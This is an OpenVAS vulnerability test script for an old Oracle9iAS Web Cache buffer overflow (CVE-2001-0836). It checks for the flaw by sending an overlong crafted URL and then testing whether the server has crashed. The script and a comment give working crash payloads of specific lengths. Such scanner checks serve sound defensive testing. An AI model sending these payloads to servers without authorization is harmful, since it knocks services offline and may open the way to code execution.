###############################################################################
# OpenVAS Vulnerability Test
# $Id: oracle9iAS_too_long_url.nasl 12621 2018-12-03 10:50:25Z cfischer $
#
# Oracle9iAS too long URL
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# References:
# Date:  Thu, 18 Oct 2001 16:16:20 +0200
# From: "andreas junestam" <andreas.junestam@defcom.com>
# Affiliation: Defcom
# To: "bugtraq" <bugtraq@securityfocus.com>
# Subject: def-2001-30
#
# Affected:
# Oracle9iAS Web Cache/2.0.0.1.0

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11081");
  script_version("$Revision: 12621 $");
  script_tag(name:"last_modification", value:"$Date: 2018-12-03 11:50:25 +0100 (Mon, 03 Dec 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(3443);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2001-0836");
  script_name("Oracle9iAS too long URL");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("This script is Copyright (C) 2002 Michel Arboi");
  script_family("Gain a shell remotely");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("Oracle/banner");
  script_require_ports("Services/www", 1100, 4000, 4001, 4002);

  script_tag(name:"solution", value:"Upgrade your server.");

  script_tag(name:"summary", value:"It may be possible to make the Oracle9i application server
  crash or execute arbitrary code by sending it a too long url
  specially crafted URL.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");

port = get_http_port( default:1100 );

if( http_is_dead( port:port ) ) exit( 0 );

banner = get_http_banner( port:port );

if( ! banner || "Oracle" >!< banner ) exit( 0 );

# Note: sending 'GET /<3571 x A> HTTP/1.0' will kill it too.
url = string( "/", crap( data:"A", length:3095 ), crap( data:"N", length:4 ) );

req = http_get( item:url, port:port );
res = http_send_recv( port:port, data:req );

if( http_is_dead( port:port, retry:4 ) ) {
  security_message( port:port );
  set_kb_item( name:"www/too_long_url_crash", value:TRUE );
  exit( 0 );
}

exit( 99 );
